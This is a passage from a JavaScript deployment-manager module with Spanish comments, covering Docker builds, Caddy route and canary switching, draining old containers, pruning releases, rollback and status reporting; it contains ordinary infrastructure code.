      buildArgNames,
      secretNames,
      labels: {
        'com.culkibo.project': safeSlug(project.id),
        'com.culkibo.project_id': project.id,
        'com.culkibo.deployment': deployment.id
      }
    });

    this.log(deployment, 'INFO', `Construyendo imagen ${deployment.imageTag}...`);
    const res = await this.runDocker(args, {
      timeoutMs: opts.buildTimeoutMs,
      cwd: contextDir,
      env: buildEnv,
      onLine,
      signal,
      projectId: deployment.projectId
    });

    if (res.aborted) return { ok: false, error: 'Construcción cancelada', aborted: true };
    if (res.code !== 0) {
      const msg = this.redact(res.stderr.trim() || `docker build terminó con código ${res.code}`, secrets);
      this.log(deployment, 'ERROR', `Fallo de construcción: ${msg.slice(0, 2000)}`);
      deployment.__failNotified = true;
      this.notify({
        event: 'deploy_failed',
        level: 'error',
        title: 'Fallo de construcción',
        message: `${deployment.projectName}: la imagen no se pudo construir.\n\n${msg.slice(0, 600)}`,
        projectId: deployment.projectId,
        projectName: deployment.projectName
      });
      return { ok: false, error: msg.slice(0, 600) };
    }

    this.log(deployment, 'SUCCESS', `Imagen ${deployment.imageTag} construida`);
    return { ok: true };
  }

  /**
   * Construye buckets de ruta Caddy preservando TODAS las políticas por dominio
   * (buckets exactos vs comodines, Basic Auth, IP Allowlist, maxBodySizeMb,
   * framePolicy, rateLimit y cabeceras personalizadas) excluyendo dominios deshabilitados.
   *
   * @param {any} deployment
   * @param {string[]} hostnames
   * @param {string[]} upstreams
   * @param {number[] | null} [weights]
   */
  _buildRouteBuckets(deployment, hostnames, upstreams, weights = null) {
    /** @type {any[]} */
    const buckets = [];
    try {
      const domainManager = require('./domainManager');
      const doms = domainManager.listByProject ? domainManager.listByProject(deployment.projectId) : [];
      const activeDoms = doms.filter((d) => d && d.status !== 'disabled');
      if (activeDoms.length > 0) {
        /** @type {Map<string, any>} */
        const grouped = new Map();
        for (const d of activeDoms) {
          const isWc = String(d.hostname || '').startsWith('*.');
          const policy = {
            securityHeaders: d.securityHeaders !== false,
            framePolicy: d.framePolicy || null,
            customHeaders: d.customHeaders || null,
            basicAuth: d.basicAuth && d.basicAuth.enabled ? d.basicAuth : null,
            ipAllowlist: Array.isArray(d.ipAllowlist) && d.ipAllowlist.length > 0 ? d.ipAllowlist : null,
            maxBodySizeMb: d.maxBodySizeMb || null,
            rateLimit: d.rateLimit && d.rateLimit.enabled ? d.rateLimit : null
          };
          const key = `${isWc ? 'wc' : 'ex'}:${JSON.stringify(policy)}`;
          if (!grouped.has(key)) grouped.set(key, { hosts: [], policy });
          grouped.get(key).hosts.push(d.hostname);
        }
        let idx = 0;
        for (const entry of grouped.values()) {
          buckets.push({
            projectId: idx === 0 ? deployment.projectId : `${deployment.projectId}_p${idx}`,
            hostnames: entry.hosts,
            upstreams,
            ...(weights ? { weights } : {}),
            ...entry.policy
          });
          idx++;
        }
      }
    } catch (e) {}

    if (buckets.length === 0) {
      buckets.push({
        projectId: deployment.projectId,
        hostnames,
        upstreams,
        ...(weights ? { weights } : {})
      });
    }
    return buckets;
  }

  /**
   * Mueve la ruta del proyecto al destino nuevo preservando modo mantenimiento,
   * cabeceras de seguridad, Basic Auth y orden de especificidad en Caddy.
   *
   * @param {any} deployment
   * @param {string[]} hostnames
   * @param {string} dial
   * @param {any} [projectHint]
   * @param {{ adminUrl?: string | null, isRemote?: boolean }} [routeOpts]
   */
  async switchRoute(deployment, hostnames, dial, projectHint = null, routeOpts = {}) {
    try {
      const pm = getProjectManager();
      const liveProject = projectHint || (pm && typeof pm.getById === 'function' ? pm.getById(deployment.projectId) : null);

      // Si el proyecto está en modo mantenimiento atómico, no pisar la página 503;
      // el nuevo upstream queda guardado en state.current para cuando se desactive.
      if (liveProject && liveProject.maintenanceMode) {
        deployment.routeSwitched = false;
        this.log(deployment, 'INFO', `Modo mantenimiento activo: release lista en ${dial} (la página 503 se mantiene hasta desactivar mantenimiento)`);
        return { ok: true, maintenancePreserved: true };
      }

      const adminUrl = routeOpts && routeOpts.adminUrl ? routeOpts.adminUrl : null;
      const isRemote = Boolean(routeOpts && routeOpts.isRemote);
      const detection = await caddyManager.detect(adminUrl ? { adminUrl } : {});
      if (!detection.available) {
        return { ok: false, error: `Caddy no está disponible: ${detection.reason}` };
      }

      if (!isRemote) {
        const ing = getIngressManager();
        if (ing && typeof ing.ensureServer === 'function') {
          try { await ing.ensureServer(); } catch (e) {}
        }
      }
      const buckets = this._buildRouteBuckets(deployment, hostnames, [dial], null);
      for (const spec of buckets) {
        await caddyManager.upsertRoute(spec, adminUrl ? { adminUrl } : {});
      }
      deployment.routeSwitched = true;
      const publishedHosts = buckets.flatMap((b) => b.hostnames);
      this.log(deployment, 'SUCCESS', `Ruta conmutada: ${publishedHosts.join(', ')} -> ${dial}`);
      return { ok: true };
    } catch (err) {
      return { ok: false, error: err.message };
    }
  }

  /**
   * Aplica un reparto ponderado de tráfico canario (`weighted_round_robin`) en Caddy
   * preservando todas las políticas de dominio (Basic Auth, IP Allowlist, cabeceras, etc.).
   *
   * @param {any} deployment
   * @param {string[]} hostnames
   * @param {{ stableDial: string, canaryDial: string, canaryWeight: number }} split
   * @param {any} [projectHint]
   * @param {{ adminUrl?: string | null, isRemote?: boolean }} [routeOpts]
   */
  async switchCanaryRoute(deployment, hostnames, { stableDial, canaryDial, canaryWeight }, projectHint = null, routeOpts = {}) {
    try {
      const weight = Math.min(99, Math.max(1, Math.round(Number(canaryWeight) || 10)));
      const adminUrl = routeOpts && routeOpts.adminUrl ? routeOpts.adminUrl : null;
      const isRemote = Boolean(routeOpts && routeOpts.isRemote);
      const detection = await caddyManager.detect(adminUrl ? { adminUrl } : {});
      if (!detection.available) {
        return { ok: false, error: `Caddy no está disponible: ${detection.reason}` };
      }
      if (!isRemote) {
        const ing = getIngressManager();
        if (ing && typeof ing.ensureServer === 'function') {
          try { await ing.ensureServer(); } catch (e) {}
        }
      }
      const buckets = this._buildRouteBuckets(deployment, hostnames, [stableDial, canaryDial], [100 - weight, weight]);
      for (const spec of buckets) {
        await caddyManager.upsertRoute(spec, adminUrl ? { adminUrl } : {});
      }
      return { ok: true, weights: [100 - weight, weight], upstreams: [stableDial, canaryDial] };
    } catch (err) {
      return { ok: false, error: err.message };
    }
  }

  /**
   * Retira la versión anterior después de la ventana de drenaje.
   *
   * Orden, y el orden es todo el asunto:
   *   1. la ruta YA apunta al contenedor nuevo (hecho antes de llamar aquí);
   *   2. se espera `drainTimeoutMs` con el viejo todavía sirviendo lo que tenía
   *      en vuelo;
   *   3. `docker stop --time=<gracia>`: SIGTERM, margen para cerrar, SIGKILL;
   *   4. NO se borra. El contenedor parado y su imagen son el ancla del
   *      rollback: volver atrás es arrancarlo y mover la ruta, no reconstruir.
   *
   * Diferencia conocida con kamal-proxy: él sabe qué peticiones tiene en vuelo
   * (lleva un `inflightMap` por destino) y termina en cuanto la última acaba,
   * cancelando de entrada las conexiones promocionadas —WebSockets— porque
   * pueden durar horas. Culkibo no tiene esa contabilidad: el proxy es Caddy y
   * no nos la expone. Así que esperamos la ventana completa, que es más lento
   * pero nunca corta antes de tiempo. El `stream_close_delay` de 5 s que
   * `caddyManager.buildRoute()` pone en el handler cubre el caso del streaming
   * durante la recarga de configuración.
   */
  async drainAndRetire(deployment, retiring, opts) {
    // Drenaje independiente por containerName (no por projectId) para que despliegues rápidos A->B->C
    // jamás dejen B colgado sin detenerse ni cancelen el drenaje de otro contenedor distinto.
    const projectId = deployment.projectId;
    const retiringName = retiring.containerName;
    const retiringServerId = retiring.serverId || deployment.serverId || 'local';
    this.cancelContainerDrain(retiringName);
    this.log(deployment, 'INFO', `Drenando ${retiringName} durante ${Math.round(opts.drainTimeoutMs / 1000)} s antes de detenerlo`);

    const cancelled = await new Promise((resolve) => {
      const timer = setTimeout(() => {
        if (this._drainTimers.get(retiringName)?.timer === timer) {
          this._drainTimers.delete(retiringName);
        }
        resolve(false);
      }, opts.drainTimeoutMs);
      if (timer.unref) timer.unref();
      this._drainTimers.set(retiringName, { projectId, timer, resolve });
    });

    if (cancelled) return;

    const latestState = this.store[projectId];
    if (!latestState || (latestState.current && latestState.current.containerName === retiringName)) {
      this.log(deployment, 'INFO', `Drenaje omitido para ${retiringName}: sigue siendo la versión activa`);
      return;
    }

    await this._withRemoteDockerEnv(retiringServerId, {}, async (remoteDockerHost) => {
      const env = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
      const rawGrace = opts && opts.stopGracePeriodSec !== undefined
        ? opts.stopGracePeriodSec
        : (opts && opts.stopGraceSeconds !== undefined ? opts.stopGraceSeconds : DEFAULTS.stopGracePeriodSec);
      const graceSec = sanitizeBoundedInt(rawGrace, DEFAULTS.stopGracePeriodSec, 0, 300);
      // Coolify #10791 & Dokploy #2227: usar --timeout (no --time/-t deprecado) tras drenar ruta Caddy
      const stop = await this.runDocker(
        ['stop', '--timeout', String(graceSec), retiringName],
        { timeoutMs: (graceSec + 20) * 1000, env }
      );
      if (stop.code === 0) {
        this.log(deployment, 'INFO', `Versión anterior detenida: ${retiringName} (se conserva para el rollback)`);
      } else {
        this.log(deployment, 'WARN', `No se pudo detener ${retiringName}: ${stop.stderr.trim()}`);
      }

      await this.pruneOldReleases(projectId, opts.keepReleases, { env });
    });
    this.saveStore();
  }

  /**
   * @param {string} projectId
   * @param {number} [keep]
   * @param {{ env?: any }} [opts]
   */
  async pruneOldReleases(projectId, keep = DEFAULTS.keepReleases, { env = undefined } = {}) {
    const state = this.getState(projectId);
    const slug = safeSlug(projectId);
    // Proteger current, previous, cualquier contenedor en vuelo (arrancando/verificando) y cualquier drenaje activo
    const alive = new Set([
      ...[state.current, state.previous].filter(Boolean).map(r => r.containerName),
      ...this.inFlightContainers,
      ...this._drainTimers.keys()
    ]);
    const aliveImages = new Set([state.current, state.previous].filter(Boolean).map(r => r.imageTag));

    // Buscar primero por label exacto `com.culkibo.project_id`, excluyendo SIEMPRE previews, hooks y contenedores protegidos/dormidos (Kamal #1923/#1655, Coolify #9654/#10996/#12542)
    const listById = await this.runDocker(
      ['ps', '-a', '--filter', `label=com.culkibo.project_id=${projectId}`, '--filter', `label!=${PROTECTED_CONTAINER_LABEL}=1`, '--format', '{{.Names}}|{{.Label "com.culkibo.preview"}}|{{.Label "com.culkibo.hook"}}|{{.Label "culkibo.protected"}}|{{.Label "culkibo.sleeping"}}'],
      { timeoutMs: 10000, env }
    );
    const listBySlug = await this.runDocker(
      ['ps', '-a', '--filter', `label=com.culkibo.project=${slug}`, '--filter', `label!=${PROTECTED_CONTAINER_LABEL}=1`, '--format', '{{.Names}}|{{.Label "com.culkibo.project_id"}}|{{.Label "com.culkibo.preview"}}|{{.Label "com.culkibo.hook"}}|{{.Label "culkibo.protected"}}|{{.Label "culkibo.sleeping"}}'],
      { timeoutMs: 10000, env }
    );
    /** @type {Set<string>} */
    const candidateContainers = new Set();
    if (listById.code === 0) {
      for (const line of (listById.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        const [name, isPreview, hookType, isProtected, isSleeping] = line.split('|');
        if (!name || isPreview === 'true' || Boolean(hookType) || isProtected === '1' || isProtected === 'true' || isSleeping === '1' || isSleeping === 'true') continue;
        candidateContainers.add(name);
      }
    }
    if (listBySlug.code === 0) {
      for (const line of (listBySlug.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        const [name, labelProjId, isPreview, hookType, isProtected, isSleeping] = line.split('|');
        if (!name || isPreview === 'true' || Boolean(hookType) || isProtected === '1' || isProtected === 'true' || isSleeping === '1' || isSleeping === 'true') continue;
        if (!labelProjId || labelProjId === projectId) {
          candidateContainers.add(name);
        }
      }
    }

    /** @type {string[]} */
    const removed = [];
    for (const name of candidateContainers) {
      if (alive.has(name)) continue;
      const res = await this.runDocker(['rm', '-f', name], { timeoutMs: 20000, env });
      if (res.code === 0) removed.push(name);
    }

    // Podar imágenes Docker antiguas del proyecto conservando solo releases exitosos recientes (`keep`), las vivas y NUNCA previews (Kamal #270)
    /** @type {string[]} */
    const removedImages = [];
    const keepTags = new Set(aliveImages);
    const historyImgs = (state.history || [])
      .filter((h) => h && h.imageTag && (h.status === 'activo' || Boolean(h.promotedAt)))
      .map((h) => h.imageTag);
    for (const tag of historyImgs.slice(0, Math.max(2, Number(keep) || 2))) keepTags.add(tag);

    const [imgByLabel, imgByRef] = await Promise.all([
      this.runDocker(['images', '--filter', `label=com.culkibo.project_id=${projectId}`, '--format', '{{.Repository}}:{{.Tag}}'], { timeoutMs: 10000, env }),
      this.runDocker(['images', '--filter', `reference=culkibo/${slug}:*`, '--format', '{{.Repository}}:{{.Tag}}|{{.Label "com.culkibo.project_id"}}'], { timeoutMs: 10000, env })
    ]);
    /** @type {Set<string>} */
    const candidateTags = new Set();
    if (imgByLabel.code === 0) {
      for (const tag of (imgByLabel.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        if (!tag.startsWith('culkibo/prev-')) candidateTags.add(tag);
      }
    }
    if (imgByRef.code === 0) {
      for (const line of (imgByRef.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        const [tag, labelProjId] = line.split('|');
        if (!tag || tag.startsWith('culkibo/prev-')) continue;
        if (!labelProjId || labelProjId === projectId) candidateTags.add(tag);
      }
    }
    for (const tag of candidateTags) {
      if (!tag || tag.includes('<none>') || keepTags.has(tag)) continue;
      const rmi = await this.runDocker(['rmi', tag], { timeoutMs: 20000, env });
      if (rmi.code === 0) removedImages.push(tag);
    }
    // Podar capas huérfanas `<none>` etiquetadas para este proyecto, excluyendo SIEMPRE culkibo.protected=1 (coolify#10996/#12542, kamal#1655)
    await this.runDocker(buildSafePruneArgs('image', { projectId }), { timeoutMs: 15000, env }).catch(() => {});

    return { removed, removedImages, keep };
  }

  /**
   * @param {string} containerName
   * @param {Set<string> | null} [protectedNames]
   * @param {{ env?: any }} [opts]
   */
  async forceRemove(containerName, protectedNames = null, { env = undefined } = {}) {
    if (!containerName) return;
    if (protectedNames && protectedNames.has(containerName)) return;
    await this.runDocker(['rm', '-f', containerName], { timeoutMs: 20000, env });
  }

  /**
   * Vuelca las últimas líneas del contenedor al log del despliegue.
   * @param {any} deployment
   * @param {string} containerName
   * @param {number} [lines]
   * @param {{ env?: any }} [opts]
   */
  async captureContainerLogs(deployment, containerName, lines = 60, { env = undefined } = {}) {
    const res = await this.runDocker(['logs', '--tail', String(lines), containerName], { timeoutMs: 10000, env });
    const text = `${res.stdout || ''}${res.stderr || ''}`.trim();
    if (!text) return;
    this.log(deployment, 'ERROR', `Últimas líneas del contenedor:\n${text.slice(0, 3000)}`);
  }

  // -------------------------------------------------------------------------
  // 6. Rollback
  // -------------------------------------------------------------------------

  /**
   * Vuelve a la versión anterior.
   *
   * Dos caminos, y el rápido es el habitual:
   *
   *   - Si el contenedor anterior sigue en ejecución (todavía estamos dentro de
   *     su ventana de drenaje), el rollback es SOLO un cambio de ruta:
   *     milisegundos, sin arrancar nada.
   *   - Si ya está parado, se arranca, se espera a que esté sano y entonces se
   *     conmuta. Nunca al revés: mover la ruta a algo que aún no responde es
   *     cambiar una versión mala por un 502.
   *
   * En ningún caso se reconstruye la imagen: el rollback no puede depender de
   * que un build vuelva a salir bien.
   */
  async rollback(projectOrId, options = {}) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Ya hay una operación de despliegue o rollback en curso para este proyecto');
    }
    const task = this._rollback(projectId, options).finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      // Nunca re-desplegar un push encolado justo después de un rollback explícito
      this.pending.delete(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  async _rollback(projectId, options = {}) {
    const opts = { ...DEFAULTS, ...options };
    const state = this.getState(projectId);
    const current = state.current;

    // Selección multi-release: permite revertir a cualquier release histórica por `deploymentId`
    let target = state.previous;
    if (options.deploymentId) {
      if (state.previous && state.previous.deploymentId === options.deploymentId) {
        target = state.previous;
      } else {
        const hist = (state.history || []).find(
          (h) => h.id === options.deploymentId && h.kind !== 'rollback' && (h.imageTag || h.containerName)
        );
        if (!hist) {
          throw new Error(`No se encontró el despliegue ${options.deploymentId} en el historial`);
        }
        target = {
          deploymentId: hist.id,
          projectName: hist.projectName || projectId,
          serverId: hist.serverId || 'local',
          imageTag: hist.imageTag,
          containerName: hist.containerName,
          hostPort: hist.hostPort,
          containerPort: hist.containerPort || DEFAULTS.containerPort,
          upstream: hist.upstream,
          healthPath: hist.strategy?.healthPath || DEFAULTS.healthPath,
          hostnames: hist.hostnames || [],
          git: hist.git || null
        };
      }
    }
    if (!target) {
      throw new Error('No hay ninguna versión anterior a la que volver');
    }

    // Clonar target para no mutar state.previous si necesitamos recrear contenedor desde imagen
    target = { ...target };

    const pm = getProjectManager();
    const liveProject = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
    const liveHostnames = liveProject ? this.hostnamesFor(liveProject) : (target.hostnames || []);
    const targetServerId = String(target.serverId || (current && current.serverId) || (liveProject && liveProject.serverId) || 'local').trim() || 'local';
    const isRemote = targetServerId !== 'local';
    target.serverId = targetServerId;

    /** @type {any} */
    const record = {
      id: `rbk_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`,
      projectId,
      projectName: (liveProject && liveProject.name) || (current && current.projectName) || projectId,
      serverId: targetServerId,
      status: 'promocionando',
      kind: 'rollback',
      imageTag: target.imageTag,
      containerName: target.containerName,
      hostPort: target.hostPort,
      containerPort: target.containerPort,
      upstream: target.upstream,
      hostnames: liveHostnames.length > 0 ? liveHostnames : (target.hostnames || []),
      routeSwitched: false,
      git: target.git || null,
      trigger: options.trigger || 'manual',
      previous: current ? { ...current } : null,
      startedAt: new Date().toISOString(),
      finishedAt: null,
      durationMs: null,
      error: null,
      logLines: []
    };
    state.history.unshift(record);
    if (state.history.length > 20) state.history.pop();

    const started = Date.now();
    /** @param {string} status @param {string | null} [error] */
    const finish = (status, error = null) => {
      record.finishedAt = new Date().toISOString();
      record.durationMs = Date.now() - started;
      record.error = error;
      this.setStatus(record, status);
      this.saveStore();
      if (status === 'fallido') {
        this.notify({
          event: 'rollback',
          level: 'error',
          title: 'Rollback fallido',
          message: `${record.projectName}: no se pudo volver a ${target.imageTag}. ${String(error || '').slice(0, 400)}`,
          projectId,
          projectName: record.projectName
        });
      }
      return record;
    };

    // P0: cancelar drenaje y proteger el contenedor destino ANTES de inspeccionar/conmutar
    this.cancelContainerDrain(target.containerName);
    this.inFlightContainers.add(target.containerName);

    let recreatedFromImage = false;
    try {
      return await this._withRemoteDockerEnv(targetServerId, {}, async (remoteDockerHost, fleet) => {
        const dockerBaseEnv = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
        const docker = await this.detectDocker({ force: true, env: dockerBaseEnv });
        if (!docker.available) return finish('fallido', docker.reason);

        const running = await this.runDocker(['inspect', '-f', '{{.State.Running}}', target.containerName], { timeoutMs: 8000, env: dockerBaseEnv });
        let needsRecreate = running.code !== 0;
        let startedExisting = false;

        if (!needsRecreate && (running.stdout || '').trim() !== 'true') {
          this.log(record, 'INFO', `Arrancando la versión anterior ${target.containerName}...`);
          const start = await this.runDocker(['start', target.containerName], { timeoutMs: 30000, env: dockerBaseEnv });
          if (start.code !== 0) {
            const msg = start.stderr.trim() || `docker start terminó con código ${start.code}`;
            if (/port is already allocated|address already in use/i.test(msg) && options.recreateOnMissing !== false && target.imageTag) {
              this.log(record, 'WARN', `Puerto ocupado al arrancar ${target.containerName}; recreando contenedor desde la imagen ${target.imageTag}...`);
              needsRecreate = true;
            } else {
              this.log(record, 'ERROR', `No se pudo arrancar la versión anterior: ${msg}`);
              return finish('fallido', msg);
            }
          } else {
            startedExisting = true;
          }
        } else if (!needsRecreate) {
          this.log(record, 'INFO', 'La versión anterior sigue viva dentro de su ventana de drenaje: el rollback es solo un cambio de ruta');
        }

        // Auto-recuperación desde imagen Docker si el contenedor antiguo fue eliminado o colisionó puerto
        if (needsRecreate) {
          if (options.recreateOnMissing === false || !target.imageTag) {
            const msg = `El contenedor de la versión anterior (${target.containerName}) ya no existe; no se puede revertir sin reconstruir`;
            this.log(record, 'ERROR', msg);
            return finish('fallido', msg);
          }
          const imgCheck = await this.runDocker(['image', 'inspect', target.imageTag], { timeoutMs: 8000, env: dockerBaseEnv });
          if (imgCheck.code !== 0) {
            const msg = `El contenedor (${target.containerName}) y su imagen (${target.imageTag}) ya no existen; no se puede revertir sin reconstruir`;
            this.log(record, 'ERROR', msg);
            return finish('fallido', msg);
          }

          await this.ensureNetwork(opts.network, { env: dockerBaseEnv, cacheKey: isRemote ? targetServerId : null });
          const newPort = isRemote
            ? await this._allocateRemotePort(targetServerId, fleet, remoteDockerHost)
            : await this.findFreePort(20000, record.id);
          const newName = `culkibo_${safeSlug(projectId)}_rbk_${crypto.randomBytes(3).toString('hex')}`;
          const linkedDb = liveProject ? this.resolveLinkedDatabases(liveProject) : { injectedEnv: {}, networks: [], secretValues: [] };
          const envVars = { ...linkedDb.injectedEnv, ...((liveProject && liveProject.envVars) || {}) };
          const validEnvNames = Object.keys(envVars).filter(isValidEnvName);
          const inlineEnvNames = validEnvNames.filter((k) => !HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));
          const fileOnlyEnvNames = validEnvNames.filter((k) => HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));
          const containerPort = target.containerPort || (liveProject && liveProject.containerPort) || DEFAULTS.containerPort;
          const safeMemMb = Math.min(32768, Math.max(64, Number(liveProject && liveProject.memoryMb) || opts.memoryMb));
          const safeCpus = String(Math.min(32, Math.max(0.1, Number(liveProject && liveProject.cpus) || Number(opts.cpus) || 1)));
          const healthPath = sanitizeHealthPath((liveProject && liveProject.healthPath) || target.healthPath || '/');
          const healthCmd = `node -e "fetch('http://127.0.0.1:${containerPort}${healthPath}').then(r=>process.exit(r.status<500?0:1)).catch(()=>process.exit(1))" || wget -qO- http://127.0.0.1:${containerPort}${healthPath} >/dev/null 2>&1 || exit 1`;

          /** @type {string | null} */
          let rbEnvFile = null;
          this.inFlightContainers.add(newName);
          try {
            if (fileOnlyEnvNames.length > 0) {
              fs.mkdirSync(TMP_ENV_DIR, { recursive: true, mode: 0o700 });
              rbEnvFile = path.join(TMP_ENV_DIR, `rbkenv_${crypto.randomBytes(8).toString('hex')}`);
              const lines = fileOnlyEnvNames.map((k) => `${k}=${String(envVars[k] == null ? '' : envVars[k]).replace(/[\r\n\0]+/g, ' ')}`);
              fs.writeFileSync(rbEnvFile, lines.join('\n') + '\n', { encoding: 'utf8', mode: 0o600 });
            }
            const runArgs = this.runArgs({
              containerName: newName,
              imageTag: target.imageTag,
              hostPort: newPort,
              containerPort,
              envNames: inlineEnvNames,
              envFile: rbEnvFile,
              network: opts.network,
              memoryMb: safeMemMb,
              cpus: safeCpus,
              pidsLimit: opts.pidsLimit,
              healthCmd,
              labels: {
                'culkibo.managed': 'true',
                'com.culkibo.project': safeSlug(projectId),
                'com.culkibo.project_id': projectId,
                'com.culkibo.deployment': record.id
              }
            });
            const rbChildEnv = {
              ...process.env,
              ...filterSafeHostEnv(envVars),
              ...(remoteDockerHost ? { DOCKER_HOST: remoteDockerHost } : {})
            };
            const runRes = await this.runDocker(runArgs, { timeoutMs: 60000, env: rbChildEnv });
            if (runRes.code !== 0) {
              const secrets = this._secretValuesForProject(projectId);
              const msg = this.redact((runRes.stderr || '').trim() || `docker run falló en rollback (${runRes.code})`, secrets);
              this.log(record, 'ERROR', msg);
              this.inFlightContainers.delete(newName);
              return finish('fallido', msg);
            }
            for (const dbNet of linkedDb.networks) {
              if (dbNet !== opts.network) {
                await this.runDocker(['network', 'connect', dbNet, newName], { timeoutMs: 10000, env: dockerBaseEnv }).catch(() => {});
              }
            }
            const up = await this.resolveUpstream({ containerName: newName, containerPort, hostPort: newPort, network: opts.network, env: dockerBaseEnv });
            target.containerName = newName;
            target.hostPort = newPort;
            target.containerPort = containerPort;
            target.upstream = up.dial;
            record.containerName = newName;
            record.hostPort = newPort;
            record.upstream = up.dial;
          } finally {
            if (rbEnvFile) { try { fs.unlinkSync(rbEnvFile); } catch (e) {} }
            if (!isRemote) {
              this._pendingPorts.delete(newPort);
              portRegistry.release(newPort, record.id);
            }
          }
          recreatedFromImage = true;
          startedExisting = true;
        }

        if (startedExisting) {
          const health = await this._withHealthTarget(targetServerId, fleet, target.hostPort, (probePort) =>
            this.waitForHealth({
              hostPort: probePort,
              containerPort: target.containerPort,
              healthPath: target.healthPath || DEFAULTS.healthPath,
              containerName: target.containerName,
              timeoutMs: opts.healthTimeoutMs,
              intervalMs: opts.healthIntervalMs,
              isRemote,
              dockerEnv: dockerBaseEnv,
              onProgress: (m) => this.log(record, 'INFO', m)
            })
          );
          if (!health.healthy) {
            const msg = `La versión anterior tampoco pasó la verificación de salud: ${health.reason}`;
            this.log(record, 'ERROR', msg);
            // Detener (o eliminar si fue recién recreado) para no dejar contenedores rotos en crash-loop
            if (recreatedFromImage) {
              await this.runDocker(['rm', '-f', target.containerName], { timeoutMs: 15000, env: dockerBaseEnv }).catch(() => {});
            } else {
              await this.runDocker(['stop', '--time', '5', target.containerName], { timeoutMs: 15000, env: dockerBaseEnv }).catch(() => {});
            }
            return finish('fallido', msg);
          }
          this.log(record, 'SUCCESS', `Versión anterior sana (HTTP ${health.status})`);
        }

        const hostnames = record.hostnames;
        if (hostnames.length > 0) {
          const switched = await this._withRouteTarget(targetServerId, fleet, (routeOpts) =>
            this.switchRoute(record, hostnames, target.upstream, liveProject, routeOpts)
          );
          if (!switched.ok) {
            if (recreatedFromImage) {
              await this.runDocker(['rm', '-f', target.containerName], { timeoutMs: 15000, env: dockerBaseEnv }).catch(() => {});
            }
            return finish('fallido', switched.error);
          }
        } else {
          this.log(record, 'WARN', 'Sin dominios asignados: no hay ninguna ruta que conmutar');
        }

        target.status = 'activo';
        target.hostnames = hostnames;
        state.current = target;
        state.previous = current || null;
        this.saveStore();

        if (current && current.containerName !== target.containerName) {
          const drain = this.drainAndRetire(record, current, opts)
            .catch(err => this.log(record, 'WARN', `Fallo al retirar ${current.containerName}: ${err.message}`))
            .finally(() => { if (this.drains.get(projectId) === drain) this.drains.delete(projectId); });
          this.drains.set(projectId, drain);
        }

        this.log(record, 'SUCCESS', `Rollback completado: sirviendo ${target.imageTag}`);
        this.notify({
          event: 'rollback',
          level: 'warning',
          title: 'Rollback ejecutado',
          message: `${record.projectName} ha vuelto a ${target.imageTag}.`,
          projectId,
          projectName: record.projectName
        });
        return finish('activo');
      });
    } catch (err) {
      this.log(record, 'ERROR', `Error inesperado en el rollback: ${err.message}`);
      return finish('fallido', err.message);
    } finally {
      this.inFlightContainers.delete(target.containerName);
    }
  }

  /** Espera al drenaje en curso. Lo usan las pruebas y el apagado ordenado. */
  async awaitDrain(projectId) {
    const drain = this.drains.get(projectId);
    if (!drain) return;
    for (const entry of this._drainTimers.values()) {
      if (entry.projectId === projectId && entry.timer && typeof entry.timer.ref === 'function') {
        entry.timer.ref();
      }
    }
    await drain;
  }

  // -------------------------------------------------------------------------
  // 7. Estado y mantenimiento
  // -------------------------------------------------------------------------

  async status(projectId) {
    const state = this.getState(projectId);
    const serverId = (state.current && state.current.serverId) || 'local';
    let docker;
    /** @type {any} */
    let containerState = null;
    if (serverId !== 'local' && state.current) {
      try {
        await this._withRemoteDockerEnv(serverId, {}, async (remoteDockerHost) => {
          const env = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
          docker = await this.detectDocker({ env });
          if (docker.available && state.current) {
            const res = await this.runDocker(
              ['inspect', '-f', '{{.State.Status}}|{{if .State.Health}}{{.State.Health.Status}}{{else}}sin-healthcheck{{end}}', state.current.containerName],
              { timeoutMs: 8000, env }
            );
            if (res.code === 0) {
              const [status, health] = (res.stdout || '').trim().split('|');
              containerState = { status, health };
            }
          }
        });
      } catch (e) {
        docker = { available: false, version: null, reason: e.message };
      }
    } else {
      docker = await this.detectDocker();
      if (docker.available && state.current) {
        const res = await this.runDocker(
          ['inspect', '-f', '{{.State.Status}}|{{if .State.Health}}{{.State.Health.Status}}{{else}}sin-healthcheck{{end}}', state.current.containerName],
          { timeoutMs: 8000 }
        );
        if (res.code === 0) {
          const [status, health] = (res.stdout || '').trim().split('|');
          containerState = { status, health };
        }
      }
    }
    const last = state.history[0] || null;
    return {
      docker,
      serverId,
      current: state.current,
      previous: state.previous,
      canRollback: Boolean(state.previous),
      activeCanary: this.getCanaryState(projectId),
      containerState,
      // Sin esto el panel no puede distinguir «no hay despliegue» de «hay uno
      // a medio construir», que es justo cuando el usuario mira la pantalla.
      inProgress: this.locks.has(projectId),
      queued: this.pending.has(projectId),
      queue: this.getQueueStatus(),
      lastDeployment: last ? { ...last, logLines: undefined, logLineCount: (last.logLines || []).length } : null
    };
  }

  /**
   * Poda de la caché de construcción de BuildKit.
   *
   * BuildKit tiene un recolector propio que `docker system prune` NO gobierna.
   * Sus valores por defecto, leídos del código de moby
   * (`daemon/internal/builder-next/worker/gc.go`) para el BuildKit embebido en
   * dockerd, que es el que usa un `docker build` normal:
   *
   *   - política 1 — `source.local`, `exec.cachemount`, `source.git.checkout`:
   *     KeepDuration = 48 h, MaxUsedSpace = max(10 % del disco x 13,8 %, 512 MB)
   *   - política 2 — todo lo demás: KeepDuration = 60 DÍAS (1440 h)
   *   - políticas 3 y 4: solo topes de espacio
   *   - topes por defecto: reservado 10 % del disco (mínimo 2 GB),
   *     máximo usado 80 %, libre mínimo 20 %
   *
   * Es decir: el famoso «48 h» existe, pero solo aplica a los tipos de caché
